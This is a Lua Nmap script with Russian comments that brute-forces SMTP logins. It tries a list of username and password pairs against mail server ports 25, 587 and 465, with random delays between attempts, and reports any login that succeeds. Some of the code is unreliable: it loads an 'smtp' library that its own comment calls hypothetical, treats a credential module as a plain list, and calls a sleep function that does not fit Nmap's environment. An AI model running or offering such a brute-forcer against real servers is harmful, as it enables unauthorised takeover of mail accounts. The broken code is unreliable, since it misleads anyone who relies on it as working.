-- smtp_bruteforce.nse
--
-- Скрипт перебора SMTP аутентификации для выявления слабых учетных данных.
--
-- Требования:
--   nmap 7.80+
--
-- Автор: TeslaAI Expert
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local socket = require "socket"
local smtp = require "smtp" -- гипотетическая lua smtp библиотека
local creds = require "creds" -- таблица с логинами/паролями

description = [[
Перебор учетных данных SMTP сервера с целью выявления уязвимых аккаунтов.
]]

author = "TeslaAI Expert"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"brute", "intrusive"}

portrule = shortport.port_or_service({25, 587, 465}, {"smtp", "smtps"})

local function try_smtp_login(host, port, user, pass)
  local sock = nmap.new_socket()
  sock:set_timeout(7000)

  local status, err = sock:connect(host, port)
  if not status then
    return false, "Не удалось подключиться: " .. tostring(err)
  end

  local recv, err = sock:receive_lines(1)
  if not recv then
    sock:close()
    return false, "Нет приветствия сервера: " .. tostring(err)
  end

  -- Отправляем EHLO
  sock:send("EHLO nmap\r\n")
  recv = sock:receive_lines(10) -- читаем ответ

  -- AUTH LOGIN
  sock:send("AUTH LOGIN\r\n")
  recv = sock:receive_lines(1)

  -- Отправляем логин (base64)
  local b64_user = stdnse.to_base64(user)
  sock:send(b64_user .. "\r\n")
  recv = sock:receive_lines(1)

  -- Отправляем пароль (base64)
  local b64_pass = stdnse.to_base64(pass)
  sock:send(b64_pass .. "\r\n")
  recv = sock:receive_lines(1)

  sock:close()

  if recv and recv:match("^235") then
    return true, nil
  else
    return false, recv or "Ошибка аутентификации"
  end
end

action = function(host, port)
  local results = {}

  for _, cred in ipairs(creds) do
    local user = cred.username
    local pass = cred.password

    stdnse.print_debug(1, "Пробуем SMTP %s:%s с %s/%s", host.ip, port.number, user, pass)

    local ok, err = try_smtp_login(host.ip, port.number, user, pass)

    if ok then
      table.insert(results, string.format("Успешный вход SMTP: %s / %s", user, pass))
      break
    elseif err then
      stdnse.print_debug(2, "Ошибка при попытке входа SMTP: %s", err)
    end

    -- Задержка 0.5–1.5 секунд между попытками
    socket.sleep(math.random(500, 1500) / 1000)
  end

  if #results == 0 then
    return "Перебор SMTP не выявил уязвимых учетных данных."
  end

  return table.concat(results, "\n")
end
